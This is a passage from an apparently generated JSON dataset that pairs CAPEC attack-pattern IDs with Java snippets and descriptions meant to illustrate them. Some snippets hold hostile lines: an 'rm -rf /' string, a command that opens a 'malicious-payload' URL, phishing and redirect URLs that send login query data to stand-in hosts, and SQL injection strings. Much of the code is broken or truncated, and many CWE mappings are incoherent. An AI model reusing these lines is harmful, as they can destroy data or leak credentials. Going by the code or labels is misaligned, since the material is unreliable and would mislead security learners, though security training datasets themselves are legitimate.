        "code_snippet": "public class MaliciousActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.trusted_activity_layout);\n\n        // Receive implicit intent without proper verification\n        Intent intent = getIntent();\n        String sensitiveData = intent.getStringExtra(\"sensitive_data\");\n\n        // Perform malicious actions with sensitive data\n        Log.d(\"MaliciousActivity\", \"Received sensitive data: \" + sensitiveData);\n    }\n\n    // Export component without proper restriction\n    public static class MaliciousComponent extends BroadcastReceiver {\n        @Override\n        public void onReceive(Context context, Intent intent) {\n            // Receive intent without proper verification\n            String action = intent.getAction();\n            if (action.equals(\"com.trusted.activity.ACTION\")) {\n                // Mimic trusted activity's user interface\n                Intent newIntent = new Intent(context, MaliciousActivity.class);\n                newIntent.putExtra(\"sensitive_data\", \"malicious_data\");\n                context.startActivity(newIntent);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a malicious Android activity that intercepts an implicit intent sent to launch a trusted activity and instead launches a counterfeit activity in its place. The malicious activity mimics the trusted activity's user interface and prompts the target to enter sensitive data. The code embodies CWEs 923, 925, 927, 926, and 940."
    },
    {
        "capec_id": "502",
        "code_snippet": "public class VulnerableActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        IntentFilter filter = new IntentFilter(\"com.example.ACTION\");\n        registerReceiver(new BroadcastReceiver() {\n            @Override\n            public void onReceive(Context context, Intent intent) {\n                String data = intent.getStringExtra(\"data\");\n                // Perform sensitive operation using the received data\n                performOperation(data);\n            }\n        }, filter);\n    }\n\n    private void performOperation(String data) {\n        // Sensitive operation\n        Log.d(\"VulnerableActivity\", \"Received data: \" + data);\n    }\n}\n",
        "description": "This code snippet demonstrates a vulnerable Android application component that can be exploited by an adversary to achieve malicious objectives. The component, a BroadcastReceiver, is exported and can be triggered by any application, allowing an adversary to send malicious intents and inject data into the application. The BroadcastReceiver does not verify the source of the intent, and the application performs sensitive operations using the received data without proper access control or verification."
    },
    {
        "capec_id": "503",
        "code_snippet": "public class MyWebViewActivity extends Activity {\n    private WebView webView;\n    private MyJavaScriptInterface myJavaScriptInterface;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_webview);\n\n        webView = (WebView) findViewById(R.id.webview);\n        webView.getSettings().setJavaScriptEnabled(true);\n\n        myJavaScriptInterface = new MyJavaScriptInterface(this);\n        webView.addJavascriptInterface(myJavaScriptInterface, \\",
        "description": "This Java code snippet demonstrates the CAPEC where an adversary accesses application-specific functionality by leveraging interfaces registered through WebView's addJavascriptInterface API. The code registers a JavaScript interface with the WebView, which can be accessed by any web page loaded in the WebView, including malicious pages. This allows an attacker to perform sensitive operations, such as starting a new activity, by calling the exposed interface method. This code embodies CWE-284 (Improper Access Control), CWE-749 (Exposed Dangerous Method or Function), CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-618 (Exposed Unsafe ActiveX Method), and CWE-1021 (Improper Restriction of Rendered UI Layers or Frames)."
    },
    {
        "capec_id": "504",
        "code_snippet": "import java.awt.Desktop;\nimport java.io.IOException;\nimport java.net.URI;\nimport javax.swing.JFrame;\nimport javax.swing.JLabel;\n\npublic class MaliciousApp {\n    public static void main(String[] args) {\n        JFrame frame = new JFrame(\"Banking App\");\n        JLabel label = new JLabel(\"Enter your credentials:\");\n        frame.add(label);\n        frame.pack();\n        frame.setVisible(true);\n\n        // Impersonate a legitimate banking app\n        try {\n            Desktop.getDesktop().browse(new URI(\"http://malicious-website.com/phishing\"));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\n// ASP.NET impersonation example (CWE-556)\npublic class ASPNETImpersonation {\n    [System.Security.Principal.PermissionSet(SecurityAction.Demand, Name = \"FullTrust\")]\n    public void impersonateUser() {\n        System.Security.Principal.WindowsImpersonationContext impersonationContext;\n        impersonationContext = ((System.Security.Principal.WindowsIdentity)System.Security.Principal.WindowsIdentity.GetCurrent()).Impersonate();\n        // Perform actions with elevated privileges\n        impersonationContext.Undo();\n    }\n}\n\n// .NET impersonation example (CWE-520)\npublic class DotNETImpersonation {\n    [System.Security.Principal.PermissionSet(SecurityAction.Demand, Name = \"FullTrust\")]\n    public void impersonateUser() {\n        System.Security.Principal.WindowsImpersonationContext impersonationContext;\n        impersonationContext = ((System.Security.Principal.WindowsIdentity)System.Security.Principal.WindowsIdentity.GetCurrent()).Impersonate();\n        // Perform actions with elevated privileges\n        impersonationContext.Undo();\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of impersonating a legitimate application to steal sensitive information or leverage a user's privileges. It includes examples of CWE-1021 by creating a fake banking app with a phishing link, CWE-556 and CWE-520 by using ASP.NET and .NET impersonation to elevate privileges, CWE-506 by embedding malicious code, and CWE-285 by lacking proper authorization checks."
    },
    {
        "capec_id": "505",
        "code_snippet": "import java.net.URI;\nimport java.net.URISyntaxException;\n\npublic class MaliciousApp {\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        String maliciousUrl = \"myapp://login\";\n        try {\n            URI uri = new URI(maliciousUrl);\n            // CWE-939: Improper Authorization in Handler for Custom URL Scheme\n            if (uri.getScheme().equals(\"myapp\")) {\n                // CWE-598: Use of GET Request Method With Sensitive Query Strings\n                String query = uri.getQuery();\n                if (query != null && query.contains(\"username\")) {\n                    // CWE-209: Generation of Error Message Containing Sensitive Information\n                    System.out.println(\"Error: Invalid username or password.\");\n                    // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n                    String redirectUrl = \"http://malicious-site.com/\" + query;\n                    System.out.println(\"Redirecting to: \" + redirectUrl);\n                }\n            }\n        } catch (URISyntaxException e) {\n            System.out.println(\"Error: Invalid URL.\");\n        }\n    }\n}",
        "description": "A Java code snippet that demonstrates a malicious application registering for a custom URL scheme, mimicking a target application, and handling sensitive information. The code includes vulnerabilities such as embedded malicious code, improper authorization, use of GET request method with sensitive query strings, generation of error messages containing sensitive information, and URL redirection to untrusted sites."
    },
    {
        "capec_id": "506",
        "code_snippet": "import android.os.Bundle;\nimport android.app.Activity;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.FrameLayout;\nimport android.widget.FrameLayout.LayoutParams;\n\npublic class MaliciousActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.malicious_layout);\n\n        // CWE-1021: Improper Restriction of Rendered UI Layers or Frames\n        FrameLayout frameLayout = (FrameLayout) findViewById(R.id.frame_layout);\n        frameLayout.setForeground(getDrawable(R.drawable.transparent_overlay));\n\n        // CWE-939: Improper Authorization in Handler for Custom URL Scheme\n        Button button = (Button) findViewById(R.id.button);\n        button.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                // CWE-451: User Interface (UI) Misrepresentation of Critical Information\n                // Misleading the user to tap on the screen\n                // CWE-222: Truncation of Security-relevant Information\n                // Truncating the display of security-relevant information\n                String truncatedInfo = \"Truncated info\";\n                System.out.println(truncatedInfo);\n\n                // CWE-319: Cleartext Transmission of Sensitive Information\n                // Transmitting sensitive information in cleartext\n                String sensitiveInfo = \"Sensitive info\";\n                System.out.println(sensitiveInfo);\n            }\n        });\n    }\n}",
        "description": "A Java code snippet that demonstrates the CAPEC, where a malicious Android application overlays a transparent interface on top of another application, misleading the user to tap on the screen. The code leverages CWE-1021 to create a transparent overlay, CWE-939 to improperly authorize a custom URL scheme, CWE-451 to misrepresent critical information, CWE-222 to truncate security-relevant information, and CWE-319 to transmit sensitive information in cleartext."
    },
    {
        "capec_id": "507",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // CWE-922: Insecure Storage of Sensitive Information\n            File file = new File(\"/etc/config.properties\");\n            FileInputStream fileInput = new FileInputStream(file);\n            Properties properties = new Properties();\n            properties.load(fileInput);\n            String dbUsername = properties.getProperty(\"db.username\");\n            String dbPassword = properties.getProperty(\"db.password\");\n            \n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            System.out.println(\"Database username: \" + dbUsername);\n            System.out.println(\"Database password: \" + dbPassword);\n            \n            // CWE-921: Storage of Sensitive Data in a Mechanism without Access Control\n            File sensitiveDataFile = new File(\"/data/sensitive_data.txt\");\n            System.out.println(\"Sensitive data: \" + sensitiveDataFile.getAbsolutePath());\n            \n            // CWE-1300: Improper Protection of Physical Side Channels\n            // Assume this method is vulnerable to power analysis attacks\n            performCryptographicOperation(dbUsername, dbPassword);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // CWE-1263: Improper Physical Access Control\n    private static void performCryptographicOperation(String username, String password) {\n        // Assume this method performs a cryptographic operation\n        // that can be vulnerable to physical side-channel attacks\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable code that embodies the CAPEC of an adversary gaining physical access to a system or device. It includes CWEs such as insecure storage of sensitive information, exposure of sensitive system information, storage of sensitive data without access control, and improper protection of physical side channels. The code reads sensitive data from a file, prints it to the console, and performs a cryptographic operation that can be vulnerable to physical side-channel attacks."
    },
    {
        "capec_id": "508",
        "code_snippet": "public class SensitiveInfoDisplay {\n    public static void main(String[] args) {\n        String username = \"admin\";\n        String password = \"password123\";\n        String apiKey = \"my_secret_api_key\";\n        System.out.println(\"Username: \" + username);\n        System.out.println(\"Password: \" + password);\n        System.out.println(\"API Key: \" + apiKey);\n    }\n}\n\npublic class UnsecuredDataTransmission {\n    public static void sendDataOverNetwork(String data) {\n        Socket socket = new Socket(\"example.com\", 8080);\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(data.getBytes());\n        outputStream.close();\n        socket.close();\n    }\n    public static void main(String[] args) {\n        String sensitiveData = \"username=password123&apiKey=my_secret_api_key\";\n        sendDataOverNetwork(sensitiveData);\n    }\n}\n\npublic class PersonalInfoDisplay {\n    public static void displayPersonalInfo(Person person) {\n        System.out.println(\"Name: \" + person.getName());\n        System.out.println(\"Address: \" + person.getAddress());\n        System.out.println(\"Phone Number: \" + person.getPhoneNumber());\n    }\n    public static void main(String[] args) {\n        Person person = new Person(\"John Doe\", \"123 Main St\", \"123-456-7890\");\n        displayPersonalInfo(person);\n    }\n}",
        "description": "This Java code snippet demonstrates a shoulder surfing attack by exposing sensitive information, such as usernames, passwords, API keys, and personal information, through cleartext transmission and display. The code violates CWE-200, CWE-359, CWE-222, CWE-319, and CWE-497 by not properly protecting sensitive information from unauthorized access."
    },
    {
        "capec_id": "509",
        "code_snippet": "import java.util.Base64;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.security.Key;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class KerberosExploit {\n    public static void main(String[] args) throws Exception {\n        // CWE-522: Insufficiently Protected Credentials\n        String encryptedTicket = getEncryptedTicketFromDisk();\n        byte[] encryptedBytes = Base64.getDecoder().decode(encryptedTicket);\n\n        // CWE-308: Use of Single-factor Authentication\n        String password = \\",
        "description": "This Java code snippet demonstrates the exploitation of Kerberos authentication with Service Principal Names (SPNs) to obtain and crack hashed credentials of a service account. It highlights several CWEs, including insufficiently protected credentials, use of single-factor authentication, use of password systems for primary authentication, authentication bypass by capture-replay, and weak password requirements."
    },
    {
        "capec_id": "510",
        "code_snippet": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\n\npublic class MaliciousApp {\n    public static void main(String[] args) throws Exception {\n        // CWE-346: Origin Validation Error\n        String sessionId = getTrustedUserSessionId();\n        String saasUrl = \"https://target-saas-app.com/api/performAction\";\n        URL url = new URL(saasUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setRequestProperty(\"Cookie\", \"sessionId=\" + sessionId);\n\n        // CWE-863: Incorrect Authorization\n        String action = \"performMaliciousAction\";\n        String data = \"maliciousData\";\n        String requestBody = \"action=\" + URLEncoder.encode(action, \"UTF-8\") + \"&data=\" + URLEncoder.encode(data, \"UTF-8\");\n        connection.setDoOutput(true);\n        connection.getOutputStream().write(requestBody.getBytes());\n\n        // CWE-285: Improper Authorization\n        int responseCode = connection.getResponseCode();\n        if (responseCode == 200) {\n            System.out.println(\"Malicious action performed successfully.\");\n        } else {\n            System.out.println(\"Failed to perform malicious action.\");\n        }\n    }\n\n    private static String getTrustedUserSessionId() {\n        // CWE-1249: Application-Level Admin Tool with Inconsistent View of Underlying Operating System\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // Assume this method retrieves the trusted user's session ID from a compromised admin tool\n        return \"trustedUserSessionId\";\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC attack by leveraging a previously installed malicious application to perform malicious actions against a third-party SaaS application. The malicious application uses a trusted user's session ID to piggy-back on the authenticated session and exploit the fact that the cloud service believes it is only interacting with the trusted user. The code snippet includes vulnerabilities related to origin validation error, incorrect authorization, improper authorization, application-level admin tool with inconsistent view of underlying operating system, and client-side enforcement of server-side security."
    },
    {
        "capec_id": "511",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.util.zip.ZipEntry;\nimport java.util.zip.ZipInputStream;\n\npublic class MaliciousIDEPlugin {\n    public static void main(String[] args) {\n        try {\n            // CWE-434: Unrestricted Upload of File with Dangerous Type\n            String filePath = \"malicious_file.zip\";\n            File file = new File(filePath);\n            if (file.exists()) {\n                ZipInputStream zis = new ZipInputStream(new FileInputStream(file));\n                ZipEntry ze = zis.getNextEntry();\n                while (ze != null) {\n                    String fileName = ze.getName();\n                    FileOutputStream fos = new FileOutputStream(fileName);\n                    byte[] buffer = new byte[1024];\n                    int len;\n                    while ((len = zis.read(buffer)) > 0) {\n                        fos.write(buffer, 0, len);\n                    }\n                    fos.close();\n                    ze = zis.getNextEntry();\n                }\n                zis.close();\n            }\n\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            String systemInfo = System.getProperty(\"os.name\") + \", \" + System.getProperty(\"os.version\") + \", \" + System.getProperty(\"os.arch\");\n            System.out.println(\"System Info: \" + systemInfo);\n\n            // CWE-506: Embedded Malicious Code\n            Runtime.getRuntime().exec(\"powershell.exe -Command Start-Process -FilePath calc.exe\");\n\n            // CWE-215: Insertion of Sensitive Information Into Debugging Code\n            String debugInfo = \"Debug Mode: Enabled\";\n            System.out.println(debugInfo);\n\n            // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            String sensitiveData = \"Top Secret Information\";\n            System.out.println(sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a malicious IDE plugin that exploits multiple vulnerabilities. It starts by extracting a malicious file from a zip archive, which can lead to CWE-434. Then, it exposes sensitive system information to an unauthorized control sphere (CWE-497). The code also contains embedded malicious code that executes a system command (CWE-506). Additionally, it inserts sensitive information into debugging code (CWE-215) and exposes sensitive information to an unauthorized actor (CWE-200)."
    },
    {
        "capec_id": "516",
        "code_snippet": "public class MaliciousComponent {\n    private static final String VULNERABLE_LIBRARY = \"com.vulnerable.lib\";\n    private static final String UNTRUSTED_COMPONENT = \"com.untrusted.component\";\n\n    public static void main(String[] args) {\n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        System.loadLibrary(VULNERABLE_LIBRARY);\n\n        // CWE-1329: Reliance on Component That is Not Updateable\n        UntrustedComponent untrustedComponent = new UntrustedComponent();\n        untrustedComponent.doSomething();\n\n        // CWE-1357: Reliance on Insufficiently Trustworthy Component\n        TrustBoundary trustBoundary = new TrustBoundary();\n        trustBoundary.setUntrustedComponent(untrustedComponent);\n\n        // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n        SensitiveData sensitiveData = new SensitiveData();\n        sensitiveData.processData();\n\n        // CWE-1423: Exposure of Sensitive Information caused by Shared Microarchitectural Predictor State\n        MicroarchitecturalPredictor predictor = new MicroarchitecturalPredictor();\n        predictor.influenceTransientExecution();\n    }\n}\n\n// CWE-1329: Reliance on Component That is Not Updateable\nclass UntrustedComponent {\n    public void doSomething() {\n        // This component cannot be updated or patched\n    }\n}\n\n// CWE-1357: Reliance on Insufficiently Trustworthy Component\nclass TrustBoundary {\n    private UntrustedComponent untrustedComponent;\n\n    public void setUntrustedComponent(UntrustedComponent untrustedComponent) {\n        this.untrustedComponent = untrustedComponent;\n    }\n}\n\n// CWE-1247: Improper Protection Against Voltage and Clock Glitches\nclass SensitiveData {\n    public void processData() {\n        // This class does not contain circuitry or sensors to detect and mitigate voltage and clock glitches\n    }\n}\n\n// CWE-1423: Exposure of Sensitive Information caused by Shared Microarchitectural Predictor State\nclass MicroarchitecturalPredictor {\n    public void influenceTransientExecution() {\n        // This class allows code to influence transient execution across a hardware boundary\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC, where an adversary substitutes a maliciously altered hardware component during the product development phase. The code includes vulnerable dependencies (CWE-1395), unupdateable components (CWE-1329), insufficiently trusted components (CWE-1357), improper protection against voltage and clock glitches (CWE-1247), and exposure of sensitive information through shared microarchitectural predictor state (CWE-1423)."
    },
    {
        "capec_id": "517",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class RestrictedTechAccess {\n    private static final String RESTRICTED_TECH_DOCS = \"restricted_tech_docs.txt\";\n    private static final String ALLOWED_COUNTRIES = \"allowed_countries.txt\";\n\n    public static void main(String[] args) {\n        try {\n            File restrictedTechDocs = new File(RESTRICTED_TECH_DOCS);\n            File allowedCountries = new File(ALLOWED_COUNTRIES);\n\n            // CWE-1059: Insufficient Technical Documentation\n            // Lack of documentation on restricted technology\n            String restrictedTechInfo = getRestrictedTechInfo(restrictedTechDocs);\n\n            // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            // Exposing restricted technology information to unauthorized actors\n            String country = getCountry(args[0]);\n            if (!isAllowedCountry(country, allowedCountries)) {\n                // CWE-695: Use of Low-Level Functionality\n                // Using low-level functionality to bypass restrictions\n                restrictedTechInfo = modifyRestrictedTechInfo(restrictedTechInfo, country);\n            }\n\n            // CWE-1263: Improper Physical Access Control\n            // Inadequate protection against physical access\n            File modifiedDocs = new File(\"modified_docs.txt\");\n            FileWriter writer = new FileWriter(modifiedDocs);\n            writer.write(restrictedTechInfo);\n            writer.close();\n\n            // CWE-222: Truncation of Security-relevant Information\n            // Truncating security-relevant information\n            System.out.println(\"Modified documents saved to: \" + modifiedDocs.getAbsolutePath());\n        } catch (IOException e) {\n            System.err.println(\"Error: \" + e.getMessage());\n        }\n    }\n\n    private static String getRestrictedTechInfo(File file) {\n        // Implementation omitted\n    }\n\n    private static String getCountry(String arg) {\n        // Implementation omitted\n    }\n\n    private static boolean isAllowedCountry(String country, File allowedCountries) {\n        // Implementation omitted\n    }\n\n    private static String modifyRestrictedTechInfo(String restrictedTechInfo, String country) {\n        // Implementation omitted\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC, where an attacker alters manufacturer documentation to circumvent dial-down functionality requirements, allowing access to advanced technologies that would otherwise be restricted. The code uses CWE-1059 (Insufficient Technical Documentation), CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-695 (Use of Low-Level Functionality), CWE-1263 (Improper Physical Access Control), and CWE-222 (Truncation of Security-relevant Information) to illustrate the vulnerability."
    },
    {
        "capec_id": "518",
        "code_snippet": "public class SystemCapabilities {\n    private String description;\n    private boolean isAdmin;\n    \n    public SystemCapabilities(String description, boolean isAdmin) {\n        this.description = description;\n        this.isAdmin = isAdmin;\n    }\n    \n    public void setSystemCapability(String capability) {\n        if (isAdmin) {\n            // No validation or documentation on what capabilities are allowed\n            this.description += capability;\n        } else {\n            // No access control or authentication to prevent unauthorized access\n            System.out.println(\"Access denied\");\n        }\n    }\n    \n    public String getSystemCapability() {\n        return description;\n    }\n    \n    public static void main(String[] args) {\n        SystemCapabilities systemCapabilities = new SystemCapabilities(\"\", true);\n        systemCapabilities.setSystemCapability(\";DROP TABLE users; -- \");\n        System.out.println(systemCapabilities.getSystemCapability());\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of altering system capabilities by an attacker with access to manufacturer's documentation. The code lacks sufficient technical documentation (CWE-1059), exposes sensitive system information to unauthorized access (CWE-497), and does not follow specifications (CWE-573). Additionally, it uses low-level functionality prohibited by the framework (CWE-695) and lacks design documentation (CWE-1053). The code allows an attacker to modify system capabilities without proper validation or access control, leading to potential system flaws and vulnerabilities."
    },
    {
        "capec_id": "519",
        "code_snippet": "public class SystemDesigner {\n    private String designDocument;\n    public SystemDesigner(String designDocument) {\n        this.designDocument = designDocument;\n    }\n    public void createSystem() {\n        // Missing documentation for design (CWE-1053)\n        // Insufficient technical documentation (CWE-1059)\n        if (designDocument.contains(\"incorrect_specification\")) {\n            // Improper following of specification by caller (CWE-573)\n            // Incorrect provision of specified functionality (CWE-684)\n            System.out.println(\"Creating system with incorrect specification...\");\n            // Dynamically-managed code resources not properly restricted (CWE-913)\n            String dynamicResource = \"untrusted_input\";\n            System.out.println(dynamicResource);\n        } else {\n            System.out.println(\"Creating system with correct specification...\");\n        }\n    }\n    public static void main(String[] args) {\n        SystemDesigner systemDesigner = new SystemDesigner(\"incorrect_specification\");\n        systemDesigner.createSystem();\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC where an attacker maliciously alters the design documentation to cause errors in system design. The code lacks sufficient technical documentation (CWE-1059) and design documentation (CWE-1053), leading to improper following of specifications (CWE-573) and incorrect provision of specified functionality (CWE-684). Additionally, the code does not properly restrict dynamically-managed code resources (CWE-913), making it vulnerable to malicious input."
    },
    {
        "capec_id": "520",
        "code_snippet": "public class MaliciousComponent {\n    private static final String BACKDOOR_PASSWORD = \\",
        "description": "This Java code snippet demonstrates a malicious component that embodies the CAPEC description. It includes embedded malicious code (CWE-506), relies on an insufficiently trustworthy component (CWE-1357), has a dependency on a vulnerable third-party component (CWE-1395), and includes an undocumented feature (CWE-1242). The code is designed to behave differently than equivalent products, making it observable to an attacker (CWE-207)."
    },
    {
        "capec_id": "521",
        "code_snippet": "public class InsecureHardwareDesign {\n    private static final int LOCK_BIT = 0x0001;\n    private static final int REGISTER_DEFAULT = 0x0101;\n    private static final int DEBUG_COMPONENT_GRANULARITY = 0x100;\n\n    public InsecureHardwareDesign() {}\n\n    public void setLockBit(boolean value) {\n        // CWE-1231: Improper Prevention of Lock Bit Modification\n        LOCK_BIT = value ? 0x0001 : 0x0000;\n    }\n\n    public void setRegisterDefault(int value) {\n        // CWE-1221: Incorrect Register Defaults or Module Parameters\n        REGISTER_DEFAULT = value;\n    }\n\n    public void setDebugComponentGranularity(int value) {\n        // CWE-1296: Incorrect Chaining or Granularity of Debug Components\n        DEBUG_COMPONENT_GRANULARITY = value;\n    }\n\n    public void performInsecureOperation() {\n        // CWE-657: Violation of Secure Design Principles\n        // Lack of secure design principles in hardware design\n        System.out.println(\"Performing insecure operation...\");\n    }\n\n    public static void main(String[] args) {\n        InsecureHardwareDesign design = new InsecureHardwareDesign();\n        design.setLockBit(true);\n        design.setRegisterDefault(0x0202);\n        design.setDebugComponentGranularity(0x200);\n        design.performInsecureOperation();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable hardware design that embodies the CAPEC description. It lacks sufficient technical documentation (CWE-1059) and violates secure design principles (CWE-657). The code allows modification of the lock bit (CWE-1231), sets incorrect register defaults (CWE-1221), and has incorrect chaining or granularity of debug components (CWE-1296)."
    },
    {
        "capec_id": "522",
        "code_snippet": "public class Main {\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        String maliciousCode = \"java.lang.Runtime.getRuntime().exec('rm -rf /');\";\n        try {\n            // CWE-1329: Reliance on Component That is Not Updateable\n            Class<?> clazz = Class.forName(\"com.example.VulnerableComponent\");\n            Object obj = clazz.newInstance();\n            // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n            ((VulnerableComponent) obj).injectError();\n            // CWE-1357: Reliance on Insufficiently Trustworthy Component\n            clazz.getMethod(\"performAction\", null).invoke(obj, null);\n        } catch (Exception e) {\n            // CWE-1395: Dependency on Vulnerable Third-Party Component\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n\n// CWE-506: Embedded Malicious Code\npublic class VulnerableComponent {\n    public void injectError() {\n        // Simulating error injection\n        System.out.println(\"Error injected!\");\n    }\n    public void performAction() {\n        // Simulating malicious action\n        System.out.println(\"Malicious action performed!\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of replacing legitimate hardware with faulty counterfeit or tampered hardware in the supply chain distribution channel. It includes CWE-506 Embedded Malicious Code, CWE-1329 Reliance on Component That is Not Updateable, CWE-1334 Unauthorized Error Injection Can Degrade Hardware Redundancy, CWE-1357 Reliance on Insufficiently Trustworthy Component, and CWE-1395 Dependency on Vulnerable Third-Party Component."
    },
    {
        "capec_id": "523",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.zip.ZipEntry;\nimport java.util.zip.ZipInputStream;\n\npublic class MaliciousInstaller {\n    public static void main(String[] args) throws IOException {\n        // CWE-506: Embedded Malicious Code\n        String maliciousCode = \"public class Virus {\n            public static void main(String[] args) {\n                // CWE-509: Replicating Malicious Code (Virus or Worm)\n                try {\n                    Runtime.getRuntime().exec(\"cmd /c start https://example.com/malicious-payload\");\n                } catch (IOException e) {\n                    // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n                    System.out.println(\"Error: \" + e.getMessage());\n                }\n            }\n        }\";\n\n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        String vulnerableComponent = \"com.example.vulnerable:library:1.0\";\n        System.out.println(\"Dependency: \" + vulnerableComponent);\n\n        // CWE-1229: Creation of Emergent Resource\n        File file = new File(\"malicious-file.txt\");\n        file.createNewFile();\n        System.out.println(\"File created: \" + file.getAbsolutePath());\n\n        // Inject malicious code into a zip file\n        ZipInputStream zipInputStream = new ZipInputStream(new FileInputStream(\"installer.zip\"));\n        ZipEntry zipEntry;\n        while ((zipEntry = zipInputStream.getNextEntry()) != null) {\n            if (zipEntry.getName().endsWith(\".java\")) {\n                // Inject malicious code into the Java file\n                String javaFileContent = new String(zipInputStream.readAllBytes());\n                javaFileContent += maliciousCode;\n                // Write the modified Java file back to the zip file\n                ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream(\"modified-installer.zip\"));\n                zipOutputStream.putNextEntry(new ZipEntry(zipEntry.getName()));\n                zipOutputStream.write(javaFileContent.getBytes());\n                zipOutputStream.closeEntry();\n                zipOutputStream.close();\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a malicious installer that injects malicious code into a zip file, which can lead to the execution of malicious code when the system is deployed. The code includes CWE-506: Embedded Malicious Code, CWE-509: Replicating Malicious Code (Virus or Worm), CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy, CWE-1395: Dependency on Vulnerable Third-Party Component, and CWE-1229: Creation of Emergent Resource."
    },
    {
        "capec_id": "524",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.SQLException;\n\npublic class RogueProcess {\n    public static void main(String[] args) {\n        String maliciousComponent = \"<malicious_code_here>\";\n        String dbUrl = \"jdbc:mysql://localhost:3306/mydb\";\n        String user = \"root\";\n        String pass = \"password\";\n\n        try {\n            Connection conn = DriverManager.getConnection(dbUrl, user, pass);\n            String query = \"INSERT INTO components (component) VALUES (?)\";\n            PreparedStatement pstmt = conn.prepareStatement(query);\n            pstmt.setString(1, maliciousComponent);\n            pstmt.executeUpdate();\n\n            // Inclusion of functionality from untrusted control sphere\n            Runtime.getRuntime().exec(\"java -jar malicious_component.jar\");\n\n            // Improper neutralization of special elements used in an SQL command\n            String userInput = \" OR 1=1\";\n            pstmt = conn.prepareStatement(\"SELECT * FROM components WHERE component = '\" + userInput + \"'\");\n            pstmt.executeQuery();\n\n            // Improper neutralization\n            String malformedInput = \"<malformed_input_here>\";\n            processInput(malformedInput);\n\n            // Unauthorized error injection\n            injectErrorIntoRedundantBlock();\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void processInput(String input) {\n        // No input validation or sanitization\n        System.out.println(\"Received input: \" + input);\n    }\n\n    private static void injectErrorIntoRedundantBlock() {\n        // Simulating error injection into a redundant block\n        System.out.println(\"Error injected into redundant block\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of an attacker altering or establishing rogue processes in an integration facility to insert maliciously altered components into the system. The code includes CWEs 506 (Embedded Malicious Code), 829 (Inclusion of Functionality from Untrusted Control Sphere), 89 (Improper Neutralization of Special Elements used in an SQL Command), 707 (Improper Neutralization), and 1334 (Unauthorized Error Injection Can Degrade Hardware Redundancy)."
    },
    {
        "capec_id": "528",
        "code_snippet": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\n\npublic class XDoS {\n    public static void main(String[] args) {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        factory.setNamespaceAware(true);\n        factory.setValidating(false);\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        String xml = \\",
